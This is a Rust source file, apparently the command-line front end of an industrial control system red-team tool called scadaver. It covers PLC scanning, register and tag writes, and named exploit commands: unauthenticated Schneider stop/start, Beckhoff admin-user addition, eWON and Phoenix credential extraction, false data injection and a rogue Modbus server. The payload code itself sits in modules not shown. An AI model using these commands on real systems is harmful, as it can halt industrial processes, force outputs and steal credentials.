use anyhow::{bail, Context, Result};
use clap::{ArgAction, Parser, Subcommand, ValueEnum};

// ===================================================================
// CLI definition
// ===================================================================

#[allow(clippy::struct_excessive_bools)]
#[derive(Parser)]
#[command(
    name = "scadaver",
    version = env!("CARGO_PKG_VERSION"),
    about = "Unified ICS Red Team Multi-Tool (Rust)",
    long_about = None,
)]
pub struct Args {
    /// Target host IP address
    #[arg(short, long, global = true)]
    pub ip: Option<String>,

    /// Override port (0 = protocol default)
    #[arg(short = 'p', long, global = true, default_value = "0")]
    pub port: u16,

    /// Timeout in seconds (overrides config file default)
    #[arg(short, long, global = true)]
    pub timeout: Option<u64>,

    /// Protocol hint (required for some operations)
    #[arg(long, global = true, value_enum)]
    pub protocol: Option<Protocol>,

    /// Randomise probe order and add inter-probe jitter to reduce scan fingerprint
    #[arg(short = 'z', long, global = true)]
    pub stealth: bool,

    /// CIDR network range to scan (e.g. 192.168.1.0/24); alternative to -i for bulk scans
    #[arg(long, global = true)]
    pub network: Option<String>,

    /// Control terminal colours: auto (default), always, or never
    #[arg(long, global = true, value_enum, default_value_t = ColorMode::Auto)]
    pub color: ColorMode,

    /// Render raw byte blocks: auto (print text only when the entire buffer is printable), text, hex, or both
    #[arg(long, global = true, value_enum, default_value_t = crate::display::ByteFormat::Auto)]
    pub byte_format: crate::display::ByteFormat,

    /// Include complete safe diagnostic cause chains on errors
    #[arg(short, long, global = true, action = ArgAction::SetTrue)]
    pub verbose: bool,

    /// Force a live protocol request and save the successful result to the local inventory
    #[arg(long, global = true)]
    pub live: bool,

    /// Do not update the local inventory/cache (also performs a live request)
    #[arg(long, global = true)]
    pub no_cache: bool,

    /// Permit a mutating command when matching inventory is more than 48 hours old
    #[arg(long, global = true)]
    pub confirm_stale: bool,

    /// OT safe mode: delay between probes, refuse mutating verbs, honour the fragile-hosts list
    #[arg(long, global = true)]
    pub safe_mode: bool,

    #[command(subcommand)]
    pub command: Option<Verb>,
}

pub use crate::protocol::Protocol;

#[derive(Clone, Copy, Debug, Default, ValueEnum)]
pub enum ColorMode {
    #[default]
    Auto,
    Always,
    Never,
}

/// Data representation for published eWON Flexy Modbus holding registers.
///
/// Flexy publishes 32-bit values as low 16-bit word followed by high 16-bit
/// word. Individual Modbus registers remain big-endian on the wire.
#[derive(Clone, Copy, Debug, PartialEq, Eq, ValueEnum)]
pub enum EwonRegisterType {
    U16,
    I16,
    U32,
    I32,
    F32,
}

#[derive(Subcommand)]
pub enum Verb {
    /// Probe for ICS devices (all protocols or --protocol for one; -i for targeted)
    Scan,
    /// Read data from a device (-i required)
    Get {
        #[command(subcommand)]
        noun: GetNoun,
    },
    /// Write data to a device (-i required)
    Set {
        #[command(subcommand)]
        noun: SetNoun,
    },
    /// Execute an exploit or action (-i required)
    Run {
        #[command(subcommand)]
        exploit: RunCmd,
    },
    /// Launch the interactive terminal UI
    Tui,
    /// Start the web interface (browser-based UI)
    Web {
        /// Host to listen on
        #[arg(long, default_value = "127.0.0.1")]
        host: String,
        /// Port to listen on
        #[arg(long, default_value = "8888")]
        port: u16,
    },
    /// Manage the device database
    Db {
        #[command(subcommand)]
        cmd: DbCmd,
    },
    /// Interactive MQTT client shell (broker recon, pub/sub, credential testing)
    Mqtt {
        /// Broker host to pre-populate in the connection console
        #[arg(long)]
        host: Option<String>,
        /// Broker port (default 1883)
        #[arg(long, default_value = "1883")]
        port: u16,
    },
    /// Import hosts into the device database from external sources
    Import {
        /// nmap XML output file to import
        #[arg(long)]
        nmap: Option<String>,
    },
    /// Export the device database
    Export {
        /// Output format: json or csv (default: json)
        #[arg(long, default_value = "json")]
        format: String,
        /// Write to file instead of stdout
        #[arg(long)]
        output: Option<String>,
    },
}

#[derive(Subcommand, Clone)]
pub enum GetNoun {
    /// Device identity and firmware info (--protocol required)
    Info,
    /// CPU run/stop/monitor state (--protocol: siemens | omron | beckhoff)
    State,
    /// Digital inputs, outputs, and merkers (Siemens S7)
    Io {
        #[arg(long)]
        password: Option<String>,
    },
    /// Tag/symbol list (--protocol: rockwell | beckhoff | phoenix | siemens | mqtt)
    Tags {
        /// Compatibility flag; Rockwell listings already show a bounded live/cached value sample by default
        #[arg(long)]
        values: bool,
        /// Show every cached tag instead of the compact 25-tag preview
        #[arg(long)]
        all: bool,
        #[arg(long)]
        username: Option<String>,
        #[arg(long)]
        password: Option<String>,
    },
    /// Read one named tag (--protocol: rockwell | beckhoff | phoenix | siemens | mqtt)
    Tag {
        name: String,
        #[arg(long)]
        username: Option<String>,
        #[arg(long)]
        password: Option<String>,
    },
    /// Holding registers FC3 (Modbus TCP)
    Register {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// Input registers FC4 (Modbus TCP)
    InputRegister {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// Coils FC1 (Modbus TCP)
    Coil {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "16")]
        count: u16,
    },
    /// Discrete inputs FC2 (Modbus TCP)
    DiscreteInput {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "16")]
        count: u16,
    },
    /// DM area words (Omron FINS TCP)
    Dm {
        #[arg(default_value = "0")]
        start: u16,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// S7 Data Block bytes (Siemens)
    Db {
        db: u16,
        #[arg(default_value = "0")]
        offset: u16,
        #[arg(default_value = "16")]
        len: u16,
        #[arg(long)]
        password: Option<String>,
    },
    /// D word registers (Mitsubishi SLMP)
    D {
        #[arg(default_value = "0")]
        start: u32,
        #[arg(default_value = "10")]
        count: u16,
    },
    /// M bit devices (Mitsubishi SLMP)
    M {
        #[arg(default_value = "0")]
        start: u32,
        #[arg(default_value = "16")]
        count: u16,
    },
    /// Probe SNMP community strings
    Community,
    /// SNMP GET a single OID
    Oid {
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// SNMP GETNEXT walk an OID subtree
    Walk {
        oid: String,
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// SNMP system info, interfaces, and topology
    Enum {
        #[arg(short, long, default_value = "public")]
        community: String,
    },
    /// IEC 60870-5-104 General Interrogation
    Gi,
    /// eWON credential store (auth bypass)
    Creds {
        #[arg(long, default_value = "20")]
        max_users: u32,
    },
    /// Schneider legacy web-session compatibility check (advisory mapping unverified)
    Session,
    /// Read one eWON Flexy published holding-register value over Modbus TCP (unit 100 by default)
    EwonRegister {
        address: u16,
        #[arg(long, value_enum, default_value_t = EwonRegisterType::U16)]
        r#type: EwonRegisterType,
        #[arg(long, default_value_t = 100)]
        unit_id: u8,
    },
    /// Read one eWON Flexy published Modbus coil (unit 100 by default)
    EwonCoil {
        address: u16,
        #[arg(long, default_value_t = 100)]
        unit_id: u8,
    },
}

#[derive(Subcommand)]
pub enum SetNoun {
    /// CPU state: run | stop | flip  (--protocol required)
    State { state: String },
    /// Write or publish one tag  NAME=VALUE  (--protocol required)
    Tag {
        /// NAME=VALUE; Rockwell accepts typed values such as `PUMP_RUN=true` or `FLOW_RATE=12.5`.
        /// MQTT accepts UTF-8 text or an even-length hexadecimal byte string.
        assignment: String,
        /// Rockwell CIP type. For MQTT: auto treats valid even-length hex as bytes and otherwise uses UTF-8 text; use `hex` or `text` to force a format.
        #[arg(long, default_value = "auto")]
        r#type: String,
        /// MQTT only: retain the published value so later subscribers can read it. This changes broker state.
        #[arg(long)]
        retain: bool,
    },
    /// Write a Modbus holding register FC6
    Register { address: u16, value: u16 },
    /// Write multiple Modbus holding registers FC16
    Registers {
        start: u16,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write a Modbus coil FC5
    Coil {
        address: u16,
        /// on | off
        state: String,
    },
    /// Write Siemens S7 digital outputs (binary string)
    Output {
        bits: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write Siemens S7 merkers (bits[,byte-offset])
    Merkers {
        bits_offset: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write DM area words (Omron FINS)
    Dm {
        start: u16,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write Siemens S7 Data Block bytes
    Db {
        db: u16,
        offset: u16,
        /// Hex data string, e.g. deadbeef
        data: String,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write D word registers (Mitsubishi SLMP)
    D {
        start: u32,
        /// Comma-separated u16 values
        values: String,
    },
    /// Write M bit devices (Mitsubishi SLMP)
    M {
        start: u32,
        /// Binary string of 0/1 bits
        bits: String,
    },
    /// SNMP SET an OID value (--confirm required)
    Oid {
        oid: String,
        value: String,
        #[arg(long)]
        community: String,
        #[arg(long, default_value = "str")]
        r#type: String,
        #[arg(long)]
        confirm: bool,
    },
    /// IEC 60870-5-104 Single Command (on | off)
    Sc {
        ioa: u32,
        /// on | off
        state: String,
    },
    /// IEC 60870-5-104 Double Command (state: 1=off 2=on 3=indeterminate)
    Dc {
        ioa: u32,
        #[arg(default_value = "2")]
        state: u8,
    },
    /// Write one eWON Flexy published holding-register value over Modbus TCP (unit 100 by default)
    EwonRegister {
        address: u16,
        #[arg(allow_hyphen_values = true)]
        value: String,
        #[arg(long, value_enum, default_value_t = EwonRegisterType::U16)]
        r#type: EwonRegisterType,
        #[arg(long, default_value_t = 100)]
        unit_id: u8,
    },
    /// Write one eWON Flexy published Modbus coil (unit 100 by default)
    EwonCoil {
        address: u16,
        /// on | off
        state: String,
        #[arg(long, default_value_t = 100)]
        unit_id: u8,
    },
}

#[derive(Subcommand)]
pub enum RunCmd {
    /// CVE-2015-4051: Reboot Beckhoff CX9020 via UPnP/SOAP
    Reboot,
    /// CVE-2015-4051: Add admin user to Beckhoff CX9020
    AddUser {
        /// username:password
        credentials: String,
    },
    /// CVE-2015-4051: Write raw bytes to a Beckhoff ADS symbol
    WriteSymbol {
        /// SymbolName=hexbytes, e.g. MAIN.valve=01
        input: String,
    },
    /// Flash identification LED on Schneider PLC
    FlashLed,
    /// Stop a Schneider lab fixture via a recovered legacy web session
    SessionStop,
    /// Start a Schneider lab fixture via a recovered legacy web session
    SessionRun,
    /// FC90: Unauthenticated stop (--model tm221 for TM221, default m340)
    Fc90Stop {
        #[arg(long, default_value = "m340")]
        model: String,
    },
    /// FC90: Unauthenticated start (--model tm221 for TM221, default m340)
    Fc90Start {
        #[arg(long, default_value = "m340")]
        model: String,
    },
    /// FC90: Force output bit on Schneider M340
    Fc90Force {
        #[arg(long, default_value = "0x11")]
        output: String,
        #[arg(long, default_value = "on")]
        state: String,
    },
    /// CVE-2016-8366: Retrieve passwords from Phoenix `WebVisit` HMI
    Passwords,
    /// eWON auth bypass: extract credential store
    EwonCreds {
        #[arg(long, default_value = "20")]
        max_users: u32,
    },
    /// OT network port scanner: TCP connect scan for common ICS/SCADA ports
    Portscan {
        /// Additional ports to scan (comma-separated, e.g. "8888,9999")
        #[arg(long)]
        ports: Option<String>,
    },
    /// CVE-2014-6271 Shellshock scanner: test CGI endpoints on PLC/HMI web servers
    Shellshock {
        /// HTTP port of the target web server
        #[arg(long, default_value = "80")]
        http_port: u16,
    },
    /// HTTP Basic Auth default-credential tester for ICS web interfaces
    DefaultCreds {
        /// URL path to authenticate against (default: /)
        #[arg(long, default_value = "/")]
        path: String,
        /// HTTP port of the target web server
        #[arg(long, default_value = "80")]
        http_port: u16,
        /// Custom wordlist file (user:pass per line); tried before built-in defaults
        #[arg(long)]
        wordlist: Option<String>,
    },
    /// False Data Injection: continuously write a forged Modbus value (SCASS Â§6.3.1)
    Fdi {
        /// Modbus address to write (0-based)
        #[arg(long)]
        address: u16,
        /// Value to inject (u16; for coils: 0=OFF, 1=ON)
        #[arg(long)]
        value: u16,
        /// Target type: register | coil
        #[arg(long, default_value = "register")]
        target: String,
        /// Seconds between writes
        #[arg(long, default_value = "2")]
        interval: u64,
        /// Stop after N writes (0 = run until Ctrl-C)
        #[arg(long, default_value = "0")]
        count: u64,
    },
    /// Rogue Modbus TCP server: impersonate a slave with configurable fixed responses
    ModbusServer {
        /// TCP port to listen on
        #[arg(long, default_value = "502")]
        port: u16,
        /// Value returned for all FC3 holding-register reads
        #[arg(long, default_value = "0")]
        reg_value: u16,
        /// Value returned for all FC1 coil reads (0=OFF, 1=ON)
        #[arg(long, default_value = "0")]
        coil_value: u8,
    },
    /// Passive ICS device discovery: ingest a .pcap/.pcapng file or live-capture a network interface
    Pcap {
        /// Offline path to a .pcap or .pcapng file to parse
        #[arg(long)]
        file: Option<String>,
        /// Live capture: network interface name (e.g. "Ethernet", "eth0")
        #[arg(long)]
        iface: Option<String>,
        /// Live capture: save captured packets to this .pcap file
        #[arg(long)]
        output: Option<String>,
        /// Live capture: stop after N packets (0 = until Ctrl-C)
        #[arg(long, default_value = "0")]
        count: u64,
    },
}

#[derive(Subcommand)]
pub enum DbCmd {
    /// Add a device to the database
    Add {
        #[arg(long)]
        ip: String,
        #[arg(long)]
        vendor: Option<String>,
    },
    /// Remove a device by database ID
    Remove {
        #[arg(long)]
        id: i64,
    },
    /// List stored devices in the database
    List,
    /// Show protocol endpoints and cached-value counts for one host
    Show {
        #[arg(long)]
        ip: String,
    },
    /// List ICS research references from awesome-ics-writeups (optionally filtered by vendor)
    Refs {
        /// Vendor slug: beckhoff, siemens, schneider, rockwell, mitsubishi, omron,
        /// phoenix, ewon, modbus, iec104, enip, snmp, malware, ics-general, general
        vendor: Option<String>,
    },
}

// ===================================================================
// Public entrypoint
// ===================================================================

#[allow(clippy::too_many_lines)]
pub fn run(args: Args, cfg: &crate::config::ConfigFile) -> Result<()> {
    let timeout = args
        .timeout
        .unwrap_or_else(|| cfg.defaults.timeout.unwrap_or(5));
    let stealth = args.stealth || cfg.defaults.stealth.unwrap_or(false);
    crate::display::print_banner();
    if stealth {
        casket::core::autodetect::set_stealth(true);
    }
    let Some(command) = args.command else {
        return Ok(());
    };
    match command {
        Verb::Tui | Verb::Web { .. } => Ok(()), // handled in main.rs before cli::run is called
        Verb::Mqtt { host, port } => crate::mqtt_shell::run_shell(host.as_deref(), port)
            .with_context(|| {
                format!(
                    "mqtt shell failed (target={}, port={port})",
                    host.as_deref().unwrap_or("not connected")
                )
            }),
        Verb::Db { cmd } => run_db(cmd).context("database command failed"),
        Verb::Scan => run_scan(
            args.ip.as_deref(),
            args.network.as_deref(),
            args.port,
            timeout,
            args.protocol,
            stealth,
            !args.no_cache,
        )
        .with_context(|| {
            args.network.as_deref().map_or_else(
                || {
                    diagnostic_context(
                        "scan",
                        args.protocol,
                        args.ip.as_deref(),
                        args.port,
                        timeout,
                    )
                },
                |network| format!("scan failed (network={network}, timeout={timeout}s)"),
            )
        }),
        Verb::Import { nmap } => run_import(nmap).context("import failed"),
        Verb::Export { format, output } => {
            run_export(&format, output.as_deref()).context("export failed")
        }
        Verb::Get { noun } => {
            let ip = require_ip(args.ip.as_ref(), "get")?;
            // `get info` asks the device a question, so it probes even when a saved record
            // exists. Cache-first here is how a five-week-old identity answered as if live.
            let live = args.live || args.no_cache || matches!(noun, GetNoun::Info);
            run_get(
                ip,
                args.port,
                timeout,
                args.protocol,
                noun,
                live,
                !args.no_cache,
            )
            .with_context(|| diagnostic_context("get", args.protocol, Some(ip), args.port, timeout))
        }
        Verb::Set { noun } => {
            let ip = require_ip(args.ip.as_ref(), "set")?;
            let protocol = resolve_set_protocol(args.protocol, &noun)?;
            // Report an unsupported operation directly.  Requiring a cached
            // inventory before this validation made a typo such as
            // `--protocol schneider set tag ...` look like a cache problem.
            if !set_operation_supported(protocol, &noun) {
                return run_set_and_invalidate_cache(
                    ip,
                    args.port,
                    timeout,
                    protocol,
                    noun,
                    args.live || args.no_cache,
                    !args.no_cache,
                )
                .with_context(|| {
                    diagnostic_context("set", args.protocol, Some(ip), args.port, timeout)
                });
            }
            ensure_fresh_inventory(ip, protocol, args.confirm_stale)?;
            let (_, effective_port, _) = resolve_cached_target(ip, args.port, protocol, true)?;
            run_set_and_invalidate_cache(
                ip,
                effective_port,
                timeout,
                protocol,
                noun,
                args.live || args.no_cache,
                !args.no_cache,
            )
            .with_context(|| diagnostic_context("set", args.protocol, Some(ip), args.port, timeout))
        }
        Verb::Run { exploit } => match exploit {
            // ModbusServer binds locally: no target IP needed.
            RunCmd::ModbusServer {
                port,
                reg_value,
                coil_value,
            } => casket::core::modbus_server::serve(port, reg_value, coil_value == 1),
            other => {
                let ip = require_ip(args.ip.as_ref(), "run")?;
                let effective_port = if let Some(protocol) = mutating_run_protocol(&other) {
                    ensure_fresh_inventory(ip, protocol, args.confirm_stale)?;
                    resolve_cached_target(ip, args.port, protocol, true)?.1
                } else {
                    args.port
                };
                run_run(ip, effective_port, timeout, other).with_context(|| {
                    diagnostic_context("run", args.protocol, Some(ip), args.port, timeout)
                })
            }
        },
    }
}

fn require_ip<'a>(ip: Option<&'a String>, verb: &str) -> Result<&'a str> {
    ip.map(String::as_str)
        .ok_or_else(|| anyhow::anyhow!("'-i <IP>' is required for '{verb}'"))
}

fn default_port(protocol: Option<Protocol>) -> Option<u16> {
    match protocol {
        Some(Protocol::Bacnet) => Some(47_808),
        Some(Protocol::Beckhoff) => Some(casket::vendors::beckhoff::scan::DEFAULT_ADS_PORT),
        Some(Protocol::Dnp3) => Some(20_000),
        Some(Protocol::Enip | Protocol::Rockwell) => Some(44_818),
        Some(Protocol::Ewon) => Some(80),
        Some(Protocol::Iec104) => Some(casket::vendors::iec104::client::IEC104_PORT),
        Some(Protocol::Mitsubishi) => Some(casket::vendors::mitsubishi::slmp::DEFAULT_PORT),
        Some(Protocol::Modbus | Protocol::Schneider) => Some(casket::core::modbus::DEFAULT_PORT),
        Some(Protocol::Mqtt) => Some(casket::vendors::mqtt::client::MQTT_PORT),
        Some(Protocol::Omron) => Some(casket::vendors::omron::fins::FINS_TCP_PORT),
        Some(Protocol::OpcUa) => Some(4840),
        Some(Protocol::Phoenix) => Some(1962),
        Some(Protocol::Siemens) => Some(102),
        Some(Protocol::Snmp) => Some(161),
        None => None,
    }
}

fn diagnostic_context(
    operation: &str,
    protocol: Option<Protocol>,
    ip: Option<&str>,
    port: u16,
    timeout: u64,
) -> String {
    let protocol_name = protocol.map_or_else(|| "auto-detect".to_string(), |p| format!("{p:?}"));
    let target = ip.unwrap_or("local/broadcast");
    let (effective_port, source) = if port == 0 {
        match default_port(protocol) {
            Some(default) => (default.to_string(), "protocol default"),
            None => ("protocol-specific".to_string(), "automatic"),
        }
    } else {
        (port.to_string(), "override")
    };
    format!(
        "{operation} failed (protocol={protocol_name}, target={target}, port={effective_port} [{source}], timeout={timeout}s)"
    )
}

fn protocol_slug(protocol: Protocol) -> &'static str {
    match protocol {
        Protocol::Bacnet => "bacnet",
        Protocol::Beckhoff => "beckhoff",
        Protocol::Dnp3 => "dnp3",
        Protocol::Enip | Protocol::Rockwell => "rockwell",
        Protocol::Ewon => "ewon",
        Protocol::Iec104 => "iec104",
        Protocol::Mitsubishi => "mitsubishi",
        Protocol::Modbus => "modbus",
        Protocol::Mqtt => "mqtt",
        Protocol::Omron => "omron",
        Protocol::OpcUa => "opcua",
        Protocol::Phoenix => "phoenix",
        Protocol::Schneider => "schneider",
        Protocol::Siemens => "siemens",
        Protocol::Snmp => "snmp",
    }
}

fn protocol_from_slug(protocol: &str) -> Option<Protocol> {
    match protocol {
        "bacnet" => Some(Protocol::Bacnet),
        "beckhoff" => Some(Protocol::Beckhoff),
        "dnp3" => Some(Protocol::Dnp3),
        "ewon" => Some(Protocol::Ewon),
        "iec104" => Some(Protocol::Iec104),
        "mitsubishi" => Some(Protocol::Mitsubishi),
        "modbus" => Some(Protocol::Modbus),
        "mqtt" => Some(Protocol::Mqtt),
        "omron" => Some(Protocol::Omron),
        "opcua" => Some(Protocol::OpcUa),
        "phoenix" => Some(Protocol::Phoenix),
        "rockwell" => Some(Protocol::Rockwell),
        "schneider" => Some(Protocol::Schneider),
        "siemens" => Some(Protocol::Siemens),
        "snmp" => Some(Protocol::Snmp),
        _ => None,
    }
}

fn cache_scan_observation(
    ip: &str,
    protocol: &str,
    port: u16,
    fields: &serde_json::Value,
) -> Result<()> {
    let mut fields = fields.clone();
    if let Some(map) = fields.as_object_mut() {
        if port != 0 && !map.contains_key("port") {
            map.insert("port".into(), serde_json::Value::from(port));
        }
    }
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    db.upsert_protocol_device(ip, protocol, &fields)?;
    db.log(ip, &format!("live scan protocol={protocol}"))?;
    Ok(())
}

fn cache_live_points(
    ip: &str,
    protocol: Protocol,
    port: u16,
    points: &[(&str, Option<&str>, &str)],
) -> Result<()> {
    let slug = protocol_slug(protocol);
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    db.upsert_data_points(ip, slug, points)?;
    let fields = match protocol {
        Protocol::Ewon => serde_json::json!({"ewon_web_port": port}),
        Protocol::Phoenix => serde_json::json!({"webvisit_port": port}),
        Protocol::Beckhoff => serde_json::json!({"port": port, "ads_port": port}),
        Protocol::Mitsubishi => serde_json::json!({"port": port, "slmp_port": port}),
        Protocol::Omron => serde_json::json!({"port": port, "fins_port": port}),
        Protocol::Rockwell | Protocol::Enip => serde_json::json!({"port": port, "enip_port": port}),
        Protocol::Schneider | Protocol::Modbus => {
            serde_json::json!({"port": port, "modbus_port": port})
        }
        Protocol::Siemens => serde_json::json!({"port": port, "s7_port": port}),
        Protocol::Snmp => serde_json::json!({"port": port, "snmp_port": port}),
        Protocol::Mqtt => serde_json::json!({"port": port, "mqtt_port": port}),
        Protocol::Iec104 => serde_json::json!({"port": port, "iec104_port": port}),
        _ => serde_json::json!({"port": port}),
    };
    db.upsert_protocol_device(ip, slug, &fields)?;
    db.log(
        ip,
        &format!("live read protocol={slug} points={}", points.len()),
    )?;
    Ok(())
}

/// A write acknowledgement does not prove that a controller retained the
/// requested value.  Drop observations for just this protocol so subsequent
/// output cannot be mistaken for a post-write read-back.  Device inventory is
/// stored separately and remains available.
fn invalidate_protocol_value_cache(ip: &str, protocol: Protocol) {
    let slug = protocol_slug(protocol);
    match crate::db::Database::open(&crate::db::Database::default_path())
        .and_then(|db| db.invalidate_data_points(ip, slug))
    {
        Ok(removed) if removed > 0 => crate::display::print_info(&format!(
            "Invalidated {removed} cached {slug} value(s); use --live to read back."
        )),
        Ok(_) => {}
        Err(err) => eprintln!(
            "[!] Write succeeded, but cached {slug} values could not be invalidated: {err}"
        ),
    }
}

/// Record a successful live operation even when the protocol response is a
/// status/identity rather than an addressable value.  Value-producing paths
/// add their data points separately; this keeps the endpoint fresh for the
/// 48-hour mutation guard and for later port resolution.
fn cache_live_endpoint(ip: &str, protocol: Protocol, port: u16, noun: &GetNoun) -> Result<()> {
    let fields = match (protocol, noun) {
        (Protocol::Ewon, GetNoun::EwonRegister { .. } | GetNoun::EwonCoil { .. }) => {
            serde_json::json!({"ewon_modbus_port": port})
        }
        (Protocol::Ewon, _) => serde_json::json!({"ewon_web_port": port}),
        (Protocol::Phoenix, GetNoun::Tags { .. } | GetNoun::Tag { .. }) => {
            serde_json::json!({"webvisit_port": port})
        }
        (Protocol::Phoenix, _) => serde_json::json!({"phoenix_info_port": port}),
        (Protocol::Beckhoff, _) => serde_json::json!({"port": port, "ads_port": port}),
        (Protocol::Mitsubishi, _) => serde_json::json!({"port": port, "slmp_port": port}),
        (Protocol::Omron, _) => serde_json::json!({"port": port, "fins_port": port}),
        (Protocol::Rockwell | Protocol::Enip, _) => {
            serde_json::json!({"port": port, "enip_port": port})
        }
        (Protocol::Schneider | Protocol::Modbus, _) => {
            serde_json::json!({"port": port, "modbus_port": port})
        }
        (Protocol::Siemens, _) => serde_json::json!({"port": port, "s7_port": port}),
        (Protocol::Snmp, _) => serde_json::json!({"port": port, "snmp_port": port}),
        (Protocol::Mqtt, _) => serde_json::json!({"port": port, "mqtt_port": port}),
        (Protocol::Iec104, _) => serde_json::json!({"port": port, "iec104_port": port}),
        _ => serde_json::json!({"port": port}),
    };
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    db.upsert_protocol_device(ip, protocol_slug(protocol), &fields)?;
    db.log(
        ip,
        &format!("live get protocol={}", protocol_slug(protocol)),
    )?;
    Ok(())
}

// ===================================================================
// Scan
// ===================================================================

fn run_scan(
    ip: Option<&str>,
    network: Option<&str>,
    port: u16,
    timeout: u64,
    protocol: Option<Protocol>,
    stealth: bool,
    cache: bool,
) -> Result<()> {
    if let Some(cidr) = network {
        return scan_network(cidr, timeout, stealth, cache);
    }
    match (ip, protocol) {
        (Some(ip), None) => {
            scan_auto(ip, timeout, cache);
            Ok(())
        }
        (Some(ip), Some(proto)) => scan_targeted(ip, port, timeout, proto, cache),
        (None, Some(proto)) => scan_broadcast(proto, timeout),
        (None, None) => {
            bail!("'-i <IP>', '--network <CIDR>', or '--protocol <PROTO>' required for scan")
        }
    }
}

fn scan_network(cidr: &str, timeout: u64, stealth: bool, cache: bool) -> Result<()> {
    const MAX_CONCURRENT: usize = 64;
    const MAX_HOSTS: usize = 65_536;
    use ipnetwork::IpNetwork;
    use std::sync::mpsc;

    let net: IpNetwork = cidr
        .parse()
        .map_err(|_| anyhow::anyhow!("invalid CIDR: {cidr}"))?;

    // Exclude network address (.0) and IPv4 broadcast (.255)
    let network_addr = net.network();
    let broadcast_addr = if let IpNetwork::V4(v4) = net {
        Some(std::net::IpAddr::V4(v4.broadcast()))
    } else {
        None
    };
    let mut hosts: Vec<std::net::IpAddr> = net
        .iter()
        .filter(|ip| *ip != network_addr && Some(*ip) != broadcast_addr)
        .collect();

    if hosts.len() > MAX_HOSTS {
        bail!(
            "CIDR range {cidr} contains {} hosts (max {MAX_HOSTS}). \
             Use a narrower range (/16 or smaller).",
            hosts.len()
        );
    }

    // Randomize probe order in stealth mode to avoid ascending-IP pattern
    if stealth {
        use rand::seq::SliceRandom as _;
        hosts.shuffle(&mut rand::thread_rng());
    }

    let host_count = hosts.len();
    crate::display::print_info(&format!("Scanning {host_count} hosts in {cidr}â€¦"));

    let (tx, rx) = mpsc::channel::<String>();
    let sem = std::sync::Arc::new(std::sync::Mutex::new(0usize));

    for host in hosts {
        let ip_str = host.to_string();
        let tx2 = tx.clone();
        let sem2 = std::sync::Arc::clone(&sem);

        // Sleep-poll semaphore: wait until a slot is free.
        loop {
            let mut count = sem2
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner);
            if *count < MAX_CONCURRENT {
                *count += 1;
                break;
            }
            drop(count);
            std::thread::sleep(std::time::Duration::from_millis(50));
        }

        std::thread::spawn(move || {
            let outcomes = casket::core::autodetect::sweep(&ip_str, timeout);
            let mut found_modbus = false;
            for o in &outcomes {
                if let Some(dev) = &o.device {
                    if dev.vendor.contains("modbus") || dev.vendor.contains("schneider") {
                        found_modbus = true;
                    }
                    if cache {
                        let fields = serde_json::to_value(&dev.fields).unwrap_or_default();
                        let _ = cache_scan_observation(&dev.ip, &dev.vendor, 0, &fields);
                    }
                    let model = dev
                        .fields
                        .get("model")
                        .or_else(|| dev.fields.get("name"))
                        .and_then(|v| v.as_str())
                        .unwrap_or("?");
                    let _ = tx2.send(format!("[+] {} â€” {} ({})", ip_str, dev.vendor, model));
                }
            }
            if !found_modbus {
                use casket::core::modbus;
                use std::net::{SocketAddr, TcpStream};
                use std::time::Duration;
                let addr_str = format!("{ip_str}:{}", modbus::DEFAULT_PORT);
                if let Ok(addr) = addr_str.parse::<SocketAddr>() {
                    if TcpStream::connect_timeout(&addr, Duration::from_secs(1)).is_ok()
                        && modbus::read_holding_registers(&ip_str, modbus::DEFAULT_PORT, 0, 1)
                            .is_ok()
                    {
                        let _ = tx2.send(format!("[+] {ip_str} â€” modbus (TCP 502)"));
                    }
                }
            }
            let mut count = sem2
                .lock()
                .unwrap_or_else(std::sync::PoisonError::into_inner);
            *count = count.saturating_sub(1);
        });
    }
    drop(tx);

    for line in rx {
        println!("{line}");
    }
    Ok(())
}

fn run_import(nmap: Option<String>) -> Result<()> {
    let Some(path) = nmap else {
        bail!("--nmap <path> is required for import");
    };
    let hosts = crate::import::parse_nmap_xml(&path)?;
    if hosts.is_empty() {
        println!("[*] No up hosts with open ports found in {path}");
        return Ok(());
    }
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    let mut count = 0usize;
    for host in &hosts {
        let fields = serde_json::json!({
            "hostnames": host.hostnames,
            "open_ports": host.open_ports,
        });
        db.upsert_device(&host.ip, "nmap", &fields)?;
        count += 1;
    }
    println!("[+] Imported {count} host(s) from {path}");
    Ok(())
}

fn run_export(format: &str, output: Option<&str>) -> Result<()> {
    let db = crate::db::Database::open(&crate::db::Database::default_path())?;
    let devices = db.load_devices()?;

    let content = if format.to_lowercase() == "csv" {
        let mut lines = vec!["ip,vendor,last_seen,fields".to_string()];
        for d in &devices {
            let fields_inline = d
                .fields
                .to_string()
                .replace('"', "\"\"")
                .replace(['\n', '\r'], " ");
            lines.push(format!(
                "{},{},{},\"{}\"",
                d.ip, d.vendor, d.last_seen, fields_inline
            ));
        }
        lines.join("\n")
    } else {
        let epoch = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let json = serde_json::json!({
            "tool": "scadaver",
            "version": env!("CARGO_PKG_VERSION"),
            "exported_at": epoch,
            "source": "cli",
            "devices": devices.iter().map(|d| serde_json::json!({
                "ip": d.ip,
                "vendor": d.vendor,
                "last_seen": d.last_seen,
                "fields": d.fields,
            })).collect::<Vec<_>>(),
        });
        serde_json::to_string_pretty(&json)?
    };

    match output {
        Some(path) => {
            std::fs::write(path, &content)?;
            println!("[+] Exported {} device(s) to {path}", devices.len());
        }
        None => println!("{content}"),
    }
    Ok(())
}

fn scan_auto(ip: &str, timeout: u64, cache: bool) {
    use colored::Colorize;
